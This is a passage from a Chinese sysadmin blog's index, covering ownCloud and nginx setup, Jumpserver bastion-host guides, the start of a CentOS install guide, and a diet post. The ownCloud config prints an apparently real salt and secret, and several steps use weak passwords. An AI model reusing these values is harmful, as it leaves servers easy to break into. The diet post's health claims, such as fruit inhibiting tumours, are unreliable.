--with-php-config=/usr/local/php/bin/php-config $ make -j 2 \u0026amp;\u0026amp; make install $ cd /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/ $ vim /usr/local/php/etc/php.ini extension = \u0026quot;intl.so\u0026quot; nginx 编译安装及配置 编译安装 $ tar -zxvf nginx-1.15.5.tar.gz $ cd nginx-1.15.5 $ ./configure --prefix=/usr/local/nginx --conf-path=/etc/nginx/nginx.conf --user=nginx --group=nginx $ useradd -s /sbin/nologin -g nginx -r nginx $ make \u0026amp;\u0026amp; make install 主配置配置文件编写 $ vim /etc/nginx.conf #user nobody; worker_processes 8; error_log /var/log/nginx/error.log; #error_log logs/error.log notice; #error_log logs/error.log info; #pid logs/nginx.pid; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include\tmime.types; server_tokens off; default_type application/octet-stream; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; client_max_body_size 4m; log_format main '$remote_addr - $remote_user [$time_local] \u0026quot;$request\u0026quot; ' '$status $body_bytes_sent \u0026quot;$http_referer\u0026quot; ' '\u0026quot;$http_user_agent\u0026quot; \u0026quot;$http_x_forwarded_for\u0026quot;'; access_log logs/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; gzip on; gzip_min_length 10k; gzip_buffers 4 48k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png; gzip_vary off; gzip_disable \u0026quot;MSIE [1-6]\\.\u0026quot;; include /etc/nginx/conf.d/*.conf; } 程序目录**\n MariaDB 安装目录: /usr/local/mariadb MariaDB 数据库目录：/data/mysql（默认，安装时可更改路径） PHP 安装目录: /usr/local/php Nginx 安装目录： /usr/local/nginx  命令一览\n MySQL 或 MariaDB 或 Percona 命令  /etc/init.d/mysqld (start|stop|restart|status)  php命令  /etc/init.d/php-fpm (start|stop|restart|status)  nginx 命令  nginx -s reload  Redis 命令（可选安装）  /etc/init.d/redis-server (start|stop|restart|status) 网站根目录\n 默认的网站根目录： /data/www/default\n 安装owncloud 1.下载项目并解压\nwget https://download.owncloud.org/community/owncloud-10.0.10.tar.bz2 tar xf owncloud-10.0.10.tar.bz2 \u0026amp;\u0026amp; cd owncloud \u0026amp;\u0026amp; rm -fr /data/www/default/* \u0026amp;\u0026amp; cp -ar * /data/www/default 2.修改项目端口\n$ vim /etc/nginx/conf.d/owncloud-officer.conf upstream php-handler { server 127.0.0.1:9000; # Depending on your used PHP version #server unix:/var/run/php5-fpm.sock; #server unix:/var/run/php7-fpm.sock; } server { listen 12312; server_name cloud.example.com; keepalive_timeout 70; # Add headers to serve security related headers # Before enabling Strict-Transport-Security headers please read into this topic first. #add_header Strict-Transport-Security \u0026quot;max-age=15552000; includeSubDomains\u0026quot;; add_header X-Content-Type-Options nosniff; add_header X-Frame-Options \u0026quot;SAMEORIGIN\u0026quot;; add_header X-XSS-Protection \u0026quot;1; mode=block\u0026quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; # Path to the root of your installation root /data/www/default/; location = /robots.txt { allow all; log_not_found off; access_log off; } # The following 2 rules are only needed for the user_webfinger app. # Uncomment it if you're planning to use this app. #rewrite ^/.well-known/host-meta /public.php?service=host-meta last; #rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last; location = /.well-known/carddav { return 301 $scheme://$host/remote.php/dav; } location = /.well-known/caldav { return 301 $scheme://$host/remote.php/dav; } # set max upload size client_max_body_size 512M; fastcgi_buffers 8 4K; # Please see note 1 fastcgi_ignore_headers X-Accel-Buffering; # Please see note 2 # Disable gzip to avoid the removal of the ETag header # Enabling gzip would also make your server vulnerable to BREACH # if no additional measures are done. See https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=773332 gzip off; # Uncomment if your server is build with the ngx_pagespeed module # This module is currently not supported. #pagespeed off; error_page 403 /core/templates/403.php; error_page 404 /core/templates/404.php; location / { rewrite ^ /index.php$uri; } location ~ ^/(?:build|tests|config|lib|3rdparty|templates|data)/ { return 404; } location ~ ^/(?:\\.|autotest|occ|issue|indie|db_|console) { return 404; } location ~ ^/(?:index|remote|public|cron|core/ajax/update|status|ocs/v[12]|updater/.+|ocs-provider/.+|core/templates/40[34])\\.php(?:$|/) { fastcgi_split_path_info ^(.+\\.php)(/.*)$; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; # necessary for owncloud to detect the contextroot https://github.com/owncloud/core/blob/v10.0.0/lib/private/AppFramework/Http/Request.php#L603 fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param modHeadersAvailable true; #Avoid sending the security headers twice fastcgi_param front_controller_active true; fastcgi_read_timeout 180; # increase default timeout e.g. for long running carddav/ caldav syncs with 1000+ entries fastcgi_pass php-handler; fastcgi_intercept_errors on; fastcgi_request_buffering off; #Available since NGINX 1.7.11 } location ~ ^/(?:updater|ocs-provider)(?:$|/) { try_files $uri $uri/ =404; index index.php; } # Adding the cache control header for js and css files # Make sure it is BELOW the PHP block location ~ \\.(?:css|js)$ { try_files $uri /index.php$uri$is_args$args; add_header Cache-Control \u0026quot;max-age=15778463\u0026quot;; # Add headers to serve security related headers (It is intended to have those duplicated to the ones above) # Before enabling Strict-Transport-Security headers please read into this topic first. #add_header Strict-Transport-Security \u0026quot;max-age=15552000; includeSubDomains\u0026quot;; add_header X-Content-Type-Options nosniff; add_header X-Frame-Options \u0026quot;SAMEORIGIN\u0026quot;; add_header X-XSS-Protection \u0026quot;1; mode=block\u0026quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; # Optional: Don't log access to assets access_log off; } location ~ \\.(?:svg|gif|png|html|ttf|woff|ico|jpg|jpeg|map)$ { add_header Cache-Control \u0026quot;public, max-age=7200\u0026quot;; try_files $uri /index.php$uri$is_args$args; # Optional: Don't log access to other assets access_log off; } }  服务器配置完成后，启动nginx，便可以在网页浏览器里面访问owncloud。输入ip和端口即可 一旦 URL 加载完毕，我们将呈现上述页面。这里，我们将创建管理员用户同时提供数据库信息。当所有信息提供完毕，点击“Finish setup”。 我们将被重定向到登录页面，在这里，我们需要输入先前创建的凭据： 一旦创建错误，可以删除/data/www/default/config.php文件，重新刷新页面，可以重新配置管理员。\n 这里提供我的一份配置 $ cat ~/owncloud/config.php \u0026lt;?php $CONFIG = array ( 'instanceid' =\u0026gt; 'oc9wp89saij8', 'passwordsalt' =\u0026gt; '2k4ULPneBUz7kUvz3wOH7uNpYwWiGx', 'secret' =\u0026gt; '97FrWKoVBzNIb3uir89QEEEnKt7IwG4B+Q+Ye2HlYrtda3OZ', 'trusted_domains' =\u0026gt; array ( 0 =\u0026gt; 'ip:port', #自己的ip和端口 ), 'datadirectory' =\u0026gt; '/data/www/default/owncloud/data', 'overwrite.cli.url' =\u0026gt; 'http://ip:port', #自己的ip和端口 'dbtype' =\u0026gt; 'mysql', 'version' =\u0026gt; '10.0.10.4', 'dbname' =\u0026gt; 'owncloud', 'dbhost' =\u0026gt; 'localhost', 'dbtableprefix' =\u0026gt; 'oc_', 'mysql.utf8mb4' =\u0026gt; true, 'dbuser' =\u0026gt; 'ocuser', 'dbpassword' =\u0026gt; 'owncloud', 'logtimezone' =\u0026gt; 'UTC', 'installed' =\u0026gt; true, 'files_external_allow_create_new_local' =\u0026gt; 'true', 'accounts.enable_medial_search' =\u0026gt; true, 'user.search_min_length' =\u0026gt; 2, 'memcache.local' =\u0026gt; '\\\\OC\\\\Memcache\\\\Redis', 'redis' =\u0026gt; array ( 'host' =\u0026gt; 'localhost', 'port' =\u0026gt; 6379, 'timeout' =\u0026gt; 0.0, 'password' =\u0026gt; 'owncloud', ), 'memcache.locking' =\u0026gt; '\\\\OC\\\\Memcache\\\\Redis', ); APACHE报错学习 1.如果你打开页面看到如下错误：\n“PHP is apparently set up to strip inline doc blocks. This will make several core apps inaccessible.”这可能是由缓存/加速器造成的，例如 Zend OPcache 或 eAccelerator。打开你的打开php.ini文件，找到：[opcache]，设置为：opcache.enable=0 和 opcache.enable_cli=0。 2.修改配置文件\nvim /usr/local/php/etc/php.d/opcache.ini [opcache] zend_extension=/usr/local/php/ext/opcache.so opcache.enable=0 opcache.memory_consumption=128 opcache.interned_strings_buffer=8 opcache.max_accelerated_files=4000 opcache.revalidate_freq=60 opcache.save_comments=0 opcache.fast_shutdown=1 opcache.enable_cli=0 ;opcache.optimization_level=0 3.输入命令重启php\nApache 命令\n/etc/init.d/httpd (start|stop|restart|status) ","permalink":"https://www.fenghong.tech/blog/2018/2018-10-11-owncloud/","tags":["Linux","ownCloud","php","nginx"],"title":"owncloud私有云搭建"},{"categories":["living"],"contents":"[TOC]\n让你吃到瘦的低热量食物 求食物的低热量低脂肪，那什么是低热量食物呢？低热量食物真的可以减肥吗？\n减肥中的人群总是追求食物的低热量低脂肪，那什么是低热量食物呢？低热量食物真的可以减肥吗？\n什么是低热量食物？ 低热量食物是指含淀粉、糖类等碳水化合物类较少的食物。\n运动量大时吃高热量食物能迅速补充能量，快速排除体外，不会在体内累积，所以不会形成脂肪；但大量摄入这类食物，又不运动的话，就会增加脂肪了！\n所以，不常运动的人可以吃低脂肪的食物。 至于低脂肪的食物，很简单，就是指那些油脂含量少的，不油腻的食物了！\n其实，脂肪代谢的能量仅次于糖类，含脂肪高，热量当然也很高了！\n想减肥的朋友其实不要太忌讳这些食物的热量和脂肪含量。\n因为人体代谢是一个平衡系统，只有各种营养素摄取均衡，才能充分代谢，也就不会有太多的剩余脂肪积累。\n低热量食物的好处？ （1） 降低超重或肥胖糖尿病朋友的体重，以恢复其正常的标准体重。\n（2） 减轻胰岛素抵抗，增加胰岛素敏感性。\n（3） 减轻胰岛B细胞负担，延缓其衰退速度。\n（4） 可适当增加你的食量，满足饱腹感，享受吃饱的乐趣，提高你的生活质量。\n低热量食物一览表： 蔬菜篇： 一、番茄（100g） 19卡\n西红柿中维生素A较丰富，维生素A对视力保护及皮肤晒后修复有好处。凉拌西红柿不撒糖更好，否则甜味可能影响食欲。肥胖者、糖尿病人、高血压病人都不宜吃被称为“雪漫火焰山”的加糖凉拌西红柿。\n二、海带（100g） 23卡\n海带是一种营养价值很高的蔬菜，同时具有一定的药用价值。含有丰富的碘等矿物质元素。海带含热量低、蛋白质含量中等、矿物质丰富。\n三、白菜 （100g） 40卡\n大白菜中膳食纤维和维生素A含量高，阳光刺眼的夏季多吃新鲜的大白菜，对护眼、养颜有益。不过，不要吃储存太久、营养素损失过多的大白菜。另外，消化性溃疡者也不宜生食大白菜，以免粗纤维的剐蹭刺激胃肠道创面。\n四、冬瓜（100g） 7卡\n冬瓜不含脂肪，含钠量低，能养胃生津，清胃降火，使人饮食量减少，冬瓜含有维生素Ｂ１可促使体内淀粉、糖转化为热能，有助于减肥。\n　五、黄瓜热量 15大卡/100g\n　黄瓜所含的黄瓜酶，能促进人体的新陈代谢，排出毒素，其中的维生素C，能美白肌肤，保持肌肤弹性，抑制黑色素的形成。老黄瓜中富含维生素E，可以延年益寿、抗衰老;黄瓜中所含的丙醇二酸 ，可抑制糖类物质转变为脂肪。\n饮料篇： 首推白开水，白开水是最好的饮料，热量为0。\n然后就是各种茶，热量都是个位数，当然不是超市里卖的那种瓶装饮料，那种饮料除了口感好，只能让你摄入更多的糖分和热量，用茶包或者茶叶冲泡的最新鲜和健康，推荐普洱茶，乌龙茶， 然后绿茶，红茶，苦丁茶. 都不错，都是刮油的。\n柠檬水也可以，热量极低，也可加蜂蜜，这样口感更好，不过一勺满蜂蜜40卡，不要贪心加多了。\n低热量食物的减肥功效有多大？\n人们普遍认为食用低热量食物不会导致发胖，这并非事实。\n脂肪含量低的确意味着所含热量低，但并不一定就不会增肥。\n所以，就算是低热量的食物也不可以过量地吃，适量就好。\n如果在摄入低热量的食物，由于口味过淡而加入更多的调味料， 效果也会适得其反哦。\n水果篇 1、草莓所含卡路里：每100克约含30大卡\n　草莓富含氨基酸、果糖、蔗糖、葡萄糖、柠檬酸、苹果酸、果胶等，这些营养素对生长发育有很好的促进作用，国外学者研究发现，草莓中的有效成分，可抑制癌肿的生长。每百克草莓含维生素C50-100毫克，比苹果、葡萄高10倍以上。科学研究业已证实，维生素C能消除细胞间的松弛与紧张状态，使脑细胞结构坚固，皮肤细腻有弹性。饭后吃一些草莓，可分解食物脂肪，有利消化。\n2、桃子热量：每100克约48大卡\n　减肥期间多吃一些桃子，绝对能获得非常理想的瘦身功效。每100克鲜桃中所含水分占比88%，蛋白质约有0.7克，碳水化合物11克，热量只有180.0千焦。桃子不仅热量非常低，它还含有大量的膳食纤维和果胶，有助增加饱腹感、促进肠胃蠕动、加快新陈代谢，是减肥瘦身的佳品。\n3、李子热量：每100克约36大卡\n　李子是低热量和富含膳食纤维和维生素C的减肥水果。李子味酸，能促进胃酸和胃消化酶的分泌，并能促进胃肠蠕动，因而有改善食欲，促进消化的作用，尤其对胃酸缺乏、食后饱胀、大便秘结者有效。\n4、火龙果所含卡路里：每100克约含51大卡\n　火龙果是一种低能量的水果，富含水溶性膳食纤维，具有减肥的功效，还有丰富的纤维，能够预防便秘。火龙果中含有一般蔬果中较少有的植物性白蛋白，这种白蛋白会与人体内的重金属离子结合而起到解毒的作用。它富含抗氧化剂维生素C，能美白皮肤防黑斑。\n了这些推荐大家可以在夏季狂吃的水果，还要提醒大家一些吃水果的时间哦!\n正确的“水果时间表” 1、早晨酸性小、吸收好\n　早晨，人体对营养吸收快、利用率高，可选择香蕉、葡萄、梨子、橙子、芒果等水果，对胃肠道刺激性低。\n2、午饭前提升饱腹感\n　午饭前，人体处于饥饿状态，避免进食过快、过多;可选择苹果、柚子、西瓜、桃子等水果，可以提升饱腹感，控制主食摄入量。\n3、午饭后促进消化\n　午饭后，不宜立刻吃水果，应在饭后1小时;可选择一些酸味水果，如山楂、柠檬、番茄、菠萝、猕猴桃等，起到助消化的作用。\n4、下午2-3点改善疲乏\n　下午2-3点人体处于疲倦、困乏状态，此时吃香蕉、西瓜、柑橘、苹果、樱桃、红枣等水果，能改善疲倦、困乏等现象。\n5、睡前安神、促进睡眠\n　睡前宜吃易消化的水果，而是选择如桂圆、红枣、橘子、柚子等这些一些助消化、安眠、缓解精神紧张的水果。\n　“除了吃不同水果的最佳时间，如何正确吃水果也值得大家注意!看看水果你吃对了吗?\n收藏，转发出去，让更多的人知道！\n","permalink":"https://www.fenghong.tech/blog/living/20181107/","tags":["food"],"title":"Health Foods"},{"categories":["ops"],"contents":"架构说明 组件说明 Jumpserver 现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。\nGithub\nCoco 实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。\nGithub\nLuna 现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。\nGithub\nproblem luna 的页面不启动解决,2222未打开等问题\nrm -f /data/opt/coco/keys/.access_key 重启服务即可，\n登陆jumpserver， 打开会话管理-----\u0026gt; 打开终端管理-----\u0026gt; 更新即可 用户资产 Web 连接资产 点击页面左边的 Web 终端：\n[打开资产所在的节点：\n[点击资产名字，就连上资产了，如果显示连接错误，请联系管理员解决\nSSH 连接资产 咨询管理员 跳板机服务器地址 及 端口 ，使用 ssh 方式输入自己的用户名和密码登录（与Web登录的用户密码一致）\n[SSH 主机登出 推荐退出主机时使用 exit 命令或者 ctrl + d 退出会话\nSFTP 上传文件到 Linux 资产 咨询管理员 跳板机服务器地址 及 端口 ，使用 ssh 方式输入自己的用户名和密码登录（与 SSH 登录跳板机的用户密码一致）\n连接成功后，可以看到当前拥有权限的资产，打开资产，然后选择系统用户，即可到资产的 /tmp 目录（/tmp 目录为管理员自定义）\n","permalink":"https://www.fenghong.tech/blog/2018/2018-09-19-jumpserver-03/","tags":["Linux","jumpServer","mariaDB","Coco","Luna","sftp"],"title":"jumpserver架构"},{"categories":["ops"],"contents":"用户页面 通过管理员发送的邮件里面的 Jumpserver 地址登录进行用户初始化\n1.0 添加密码及MFA 点击设置密码\n要求10位数，必须有大写字母，其他无所谓 登录名为：您的英文名（全小写）。 密码为：您刚设置的密码。 点击下一步---\u0026gt; 跳过google应用---\u0026gt; 点击下一步----\u0026gt;  MFA  到达上图所示界面时，即开始验证MFA，建议使用阿里云的MFA，不要使用google的,所以跳过了这个过程，下面这个是阿里云网址截图的app。\n下载阿里云app完毕后，进入app界面（建议不要卸载）。\n点击----\u0026gt;\u0026gt; 控制台-----\u0026gt;\u0026gt;\t虚拟MFA-----\u0026gt;\u0026gt; 点击右上角+，扫描添加MFA，绑定成功返回登录,登录成功后填写个人信息。 1.1 查看个人信息 个人信息页面展示了用户的名称、角色、邮件、所属用户组、SSh 公钥、创建日期、最后登录日期和失效日期等信息：\n1.2 修改密码 在个人信息页面点击\u0026quot;更改密码\u0026quot;按钮，跳转到修改密码页面，正确输入新旧密码，即可完成密码修改:\n1.3 设置或禁用 MFA 在个人信息页面点击\u0026quot;设置MFA\u0026quot;按钮（设置完成后按钮会禁用MFA），根据提示处理即可，MFA全称是Multi-Factor Authentication，遵循（TOTP）标准（RFC 6238）\n1.4 修改 SSH 公钥 点击\u0026quot;重置 SSH 密钥\u0026quot;按钮，跳转到修改 SSH 密钥信息页，复制 SSH 密钥信息到指定框中，即可完成 SSH 密钥修改：\n查看 SSH 公钥信息：\n$ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDadDXxxx...... 1.5 查看个人资产 自己被授权的资产，增减授权资产的需求请联系管理员\n","permalink":"https://www.fenghong.tech/blog/2018/2018-09-19-jumpserver-02/","tags":["Linux","jumpServer","MFA"],"title":"jumpserver用户使用"},{"categories":["ops"],"contents":"快速入门 必备条件  一台安装好 Jumpserver 系统的可用主机（堡垒机） 一台或多台可用的 Linux、Windows资产设备（被管理的资产）  一、系统设置 1.1 基本设置\n# 修改 URL 的 localhost 为你的实际 url 地址，否则邮件收到的地址将为 localhost 修改完 url 地址后需要重启 jumpserver 服务（重启才能生效，后续会解决这个问题） 1.2 邮件设置\n# 点击页面上边的\u0026quot;邮件设置\u0026quot; TAB ，进入邮件设置页面 # 配置邮件服务后，点击页面的\u0026quot;测试连接\u0026quot;按钮，如果配置正确，Jumpserver 会发送一条测试邮件到 您的 SMTP 账号邮箱里面，确定收到测试邮件后点击保存即可使用。 1.3 LDAP设置\n# 如果不需要使用 ldap 登陆 jumpserver，可以直接跳过，不需要设置 # 先测试通过才能保存 # DN 和 OU 一定要完整(如DN:cn=Manage,ou=Jumpserver,dc=jumpserver,ou=org) 注：可借用第三方 gui 工具查看 ldap 用户的属性，新版本已经支持中文名登录，即cn=中文也可正常使用 1.4 终端设置\n# 命令记录保存到 elastic {\u0026quot;default\u0026quot;: {\u0026quot;TYPE\u0026quot;:\u0026quot;server\u0026quot;}, \u0026quot;ali-es\u0026quot;: {\u0026quot;TYPE\u0026quot;: \u0026quot;elasticsearch\u0026quot;, \u0026quot;HOSTS\u0026quot;: [\u0026quot;http://elastic:changeme@localhost:9200\u0026quot;]}} # 录像存储在 oss，Jumpserver 系统设置-终端设置 录像存储 {\u0026quot;default\u0026quot;: {\u0026quot;TYPE\u0026quot;: \u0026quot;server\u0026quot;}, \u0026quot;cn-north-1\u0026quot;: {\u0026quot;TYPE\u0026quot;: \u0026quot;s3\u0026quot;, \u0026quot;BUCKET\u0026quot;: \u0026quot;jumpserver\u0026quot;, \u0026quot;ACCESS_KEY\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;SECRET_KEY\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;REGION\u0026quot;: \u0026quot;cn-north-1\u0026quot;}, \u0026quot;ali-oss\u0026quot;: {\u0026quot;TYPE\u0026quot;: \u0026quot;oss\u0026quot;, \u0026quot;BUCKET\u0026quot;: \u0026quot;jumpserver\u0026quot;, \u0026quot;ACCESS_KEY\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;SECRET_KEY\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;ENDPOINT\u0026quot;: \u0026quot;http://oss-cn-hangzhou.aliyuncs.com\u0026quot;}} 注：修改后，需要修改在Jumpserver 会话管理-终端管理 修改terminal的配置 录像存储 命令记录，然后重启 Jumpserver 服务 1.5 安全设置\n二、创建用户 2.1 创建 Jumpserver 用户\n# 点击页面左侧“用户列表”菜单下的“用户列表“，进入用户列表页面 # 点击页面左上角“创建用户”按钮，进入创建用户页面，（也可以通过右上角导入模版进行用户导入） # 其中，用户名即 Jumpserver 登录账号（具有唯一性，不能重名）。名称为页面右上角用户标识（可重复） # 成功提交用户信息后，Jumpserver 会发送一条设置\u0026quot;用户密码\u0026quot;的邮件到您填写的用户邮箱 # 点击邮件中的设置密码链接，设置好密码后，您就可以用户名和密码登录 Jumpserver 了。 # 用户首次登录 Jumpserver，会被要求完善用户信息，按照向导操作即可。 注：MFA 即 Google Authenticator ，使用此软件需要APP时间与浏览器时间同步 三、创建资产 3.1 创建 Linux 资产\n3.1.1 编辑资产树\n# 节点不能重名，右击节点可以添加、删除和重命名节点，以及进行资产相关的操作 注：如果有 linux 资产和 windows 资产，建议先建立 Linux 节点与 Windows 节点，不然授权时不好处理 3.1.2 创建管理用户\n# 管理用户是资产上的 root，或拥有 NOPASSWD: ALL sudo 权限的用户，Jumpserver 使用该用 户来推送系统用户、获取资产硬件信息等 # 如果使用ssh私钥管理资产，需要先在资产上设置，这里举个例子供参考（本例登录资产使用root为例） (1). 在资产上生成 root 账户的公钥和私钥 $ ssh-keygen -t rsa # 默认会输入公钥和私钥文件到 ~/.ssh 目录 (2). 将公钥输出到文件 authorized_keys 文件，并修改权限 $ cat ~/.ssh/id_rsa.pub \u0026gt;\u0026gt; ~/.ssh/authorized_keys $ chmod 400 ~/.ssh/authorized_keys (3). 打开RSA验证相关设置 $ vim /etc/ssh/sshd_config RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys (4). 重启 ssh 服务 $ service sshd restart (5). 上传 ~/.ssh 目录下的 id_rsa 私钥到 jumpserver 的管理用户中 # 这样就可以使用 ssh私钥 进行管理服务器 # 名称可以按资产树来命名。用户名root。密码和 SSH 私钥必填一个 3.1.3 创建系统用户\n# 系统用户是 Jumpserver 跳转登录资产时使用的用户，可以理解为登录资产用户 # 系统用户的 Sudo 栏设定用户的 sudo 权限 # 这里简单举几个例子 Sudo /bin/su # 当前系统用户可以免sudo密码执行sudo su命令 Sudo /usr/bin/git,/usr/bin/php,/bin/cat,/bin/more,/bin/less,/usr/bin/tail # 当前系统用户可以免sudo密码执行git php cat more less tail Sudo !/usr/bin/yum # 禁止执行 yum 权限 # 此处的权限应该根据使用用户的需求汇总后定制，原则上给予最小权限即可 # 下图为不允许用户执行一些危险的操作，允许其他的所有权限 # 系统用户创建时，如果选择了自动推送 Jumpserver 会使用 Ansible 自动推送系统用户到资产中， 如果资产(交换机、Windows )不支持 Ansible, 请手动填写资产上已有的账号及账号密码 # 如果不想使用 Jumpserver 推送用户，请去掉自动生成密钥、自动推送勾选。手动填写资产上已有的账号及账号密码 # 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息 3.1.4 创建资产\n# 点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。 # 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。 # IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能\u0026quot;牢靠\u0026quot;地登录指定的 IP 主机上。 资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。 # 资产创建信息填写好保存之后，可测试资产是否能正确连接 注：被连接资产需要python组件，且版本大于等于2.6，Ubuntu等资产默认不允许root用户远程ssh登录，请自行处理 # 如果资产不能正常连接，请检查管理用户的用户名和密钥是否正确以及该管理用户是否能使用 SSH 从 Jumpserver 主机正确登录到资产主机上 参考 Linux 资产连接说明\n3.1.5 网域列表\n# 网域功能是为了解决部分环境无法直接连接而新增的功能，原理是通过网关服务器进行跳转登录 # 点击页面左侧的“网域列表”按钮，查看所有网域列表 # 点击页面左上角的“创建网域”按钮，进入网域创建页面，选择资产里用作网域的网关服务器 注：混合云适用 # 点击网域的名称，进入网域详情列表。 # 点击页面的“网关”按钮，选择网关列表的“创建网关”按钮，进入网关创建页面，填写网关信息。 # IP信息一般默认填写网域资产的IP即可（如用作网域的资产有多块网卡和IP地址，选能与jumpserer通信的任一IP即可） 注：用户名与密码可以使用网关资产上已存在的任一拥有执行 ssh 命令权限的用户 注：保存信息后点击测试连接，确定设置无误后到资产列表添加需要使用网关登录的资产即可。 3.2 创建 Windows 资产\n3.2.1 创建 Windows 系统管理用户\n注：同 Linux 系统的管理用户一样，名称可以按资产树来命名，用户名是管理员用户名，密码是管理员的密码 3.2.2 创建 Windows 系统系统用户\n# 目前 Windows 暂不支持自动推送，用户必须在系统中存在且有权限使用远程连接，请确认资产的防火墙已经开放 注：Windows 资产协议务必选择 rdp # 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息 3.2.3 创建 Windows 资产\n# 同创建 Linux 资产一样。 # 创建 Windows 资产，系统平台请选择正确的 Windows，默认 RDP 端口号为3389，IP 和 管理用户请正确选择， 注：确保管理用户能正确登录到指定的 IP 主机上 参考 Windows 资产连接说明\n四、资产节点管理 4.1 为资产树节点分配资产\n注：在资产列表页面，选择要添加资产的节点，右键，选择添加资产到节点(一台资产可以同时在多个节点下面) 注：选择要被添加的资产，点击\u0026quot;确认\u0026quot;即可。 4.2 删除节点资产\n注：选择要被删除的节点，选择\u0026quot;从节点删除\u0026quot;，点击\u0026quot;提交\u0026quot;即可。 五、创建授权规则 # 名称，授权的名称，不能重复 # 用户和用户组二选一，不推荐即选择用户又选择用户组 # 资产和节点二选一，选择节点会包含节点下面的所有资产 # 系统用户，及所选的用户或用户组下的用户能通过该系统用户使用所选节点或者节点下的资产 # 用户（组），资产（节点），系统用户是一对一的关系，所以当拥有 Linux、Windows 不同类型资产时， 应该分别给 Linux 资产和 Windows 资产创建授权规则。 资产授权与节点授权的区别请参考下面示例，一般情况下，资产授权给个人，节点授权给用户组，一个授权只能选择一个系统用户\n注：创建的授权规则，节点要与资产所在的节点一致 # 原则上，一个授权只能同时授予一个用户或者一个组 # 意思是：把个人的资产授权给个人，把部门的资产授权给部门，把项目的资产授权给项目... # 职责不同，权限就不同，按照职责制定系统用户 # 这样授权就不会乱 六、用户使用资产 6.1 登录 Jumpserver\n# 用户只能看到自己被管理员授权了的资产，如果登录后无资产，请联系管理员进行确认 6.2 使用资产\n6.2.1 连接资产\n# 点击页面左边的 Web 终端： # 打开资产所在的节点： # 点击资产名字，就连上资产了，整个过程不需要用户输入资产的任何信息 # 如果显示连接超时，请参考FAQ文档进行处理 6.2.2 断开资产\n# 点击页面顶部的 Server 按钮会弹出选个选项，第一个断开所选的连接，第二个断开所有连接。 ","permalink":"https://www.fenghong.tech/blog/2018/2018-09-19-jumpserver-01/","tags":["Linux","jumpServer","Coco","Python"],"title":"jumpserver管理者使用"},{"categories":["ops"],"contents":"CentOS 6 安装文档 说明  # 开头的行表示注释 \u0026gt; 开头的行表示需要在 mysql 中执行 $ 开头的行表示需要执行的命令  本文档适用于有一定web运维经验的管理员或者工程师，文中不会对安装的软件做过多的解释，仅对需要执行的内容注部分注释，更详细的内容请参考其他安装。\n安装过程中遇到问题可参考 安装过程中常见的问题\n环境  系统: CentOS 6 IP: xx.xx.xx.xx 目录: /data/data/opt 数据库: mariadb-10.2.15,用的是开发机上的mysql数据库 代理: nginx  开始安装 # 防火墙 与 selinux 设置说明，如果已经关闭了 防火墙 和 Selinux 的用户请跳过设置 # 修改字符集，否则可能报 input/output error的问题，因为日志里打印了中文，目前未修改 $ localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8 $ export LC_ALL=zh_CN.UTF-8 $ echo 'LANG=\u0026quot;zh_CN.UTF-8\u0026quot;' \u0026gt; /etc/locale.conf # 安装依赖包 $ yum -y install wget sqlite-devel xz gcc automake zlib-devel openssl-devel epel-release git # 安装 Redis, Jumpserver 使用 Redis 做 cache 和 celery broke $ yum -y install redis $ chkconfig redis on $ service redis start # 安装 MySQL # 创建数据库 Jumpserver 并授权 $ mysql -uroot \u0026gt; create database jumpserver default charset 'utf8'; \u0026gt; grant all on jumpserver.* to 'jumpserver'@'127.0.0.1' identified by 'weakPassword'; \u0026gt; flush privileges; # 安装 Nginx ，用作代理服务器整合 Jumpserver 与各个组件 $ yum -y install nginx $ chkconfig nginx on # 下载编译 Python3.6.1 $ wget https://www.python.org/ftp/python/3.6.1/Python-3.6.1.tar.xz $ tar xvf Python-3.6.1.tar.xz \u0026amp;\u0026amp; cd Python-3.6.1 $ ./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install # 配置并载入 Python3 虚拟环境 $ cd /data/opt $ python3 -m venv py3 # py3 为虚拟环境名称，可自定义 $ source /data/opt/py3/bin/activate # 退出虚拟环境可以使用 deactivate 命令 # 看到下面的提示符代表成功，以后运行 Jumpserver 都要先运行以上 source 命令，载入环境后默认以下所有命令均在该虚拟环境中运行 (py3) [root@localhost py3] # 自动载入 Python3 虚拟环境 $ cd /data/opt $ git clone git://github.com/kennethreitz/autoenv.git $ echo 'source /data/opt/autoenv/activate.sh' \u0026gt;\u0026gt; ~/.bashrc $ source ~/.bashrc # 下载 Jumpserver 与 Coco $ cd /data/opt/ $ git clone https://github.com/jumpserver/jumpserver.git \u0026amp;\u0026amp; 